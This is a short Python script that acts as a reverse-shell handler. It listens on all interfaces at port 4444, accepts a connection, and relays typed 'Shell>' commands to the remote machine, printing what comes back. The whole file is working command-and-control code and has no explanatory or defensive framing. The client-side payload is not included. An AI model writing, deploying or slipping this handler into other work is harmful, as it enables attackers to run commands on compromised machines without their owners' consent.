import socket

def start_server(host, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(1)
        print(f"Listening on {host}:{port}...")

        conn, addr = server.accept()
        print(f"Connection from {addr}")

        while True:
            command = input("Shell> ")
            if command.lower() == "exit":
                conn.send(command.encode())
                break
            conn.send(command.encode())
            response = conn.recv(4096).decode()
            print(response)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.close()

# Configure the server
start_server("0.0.0.0", 4444)
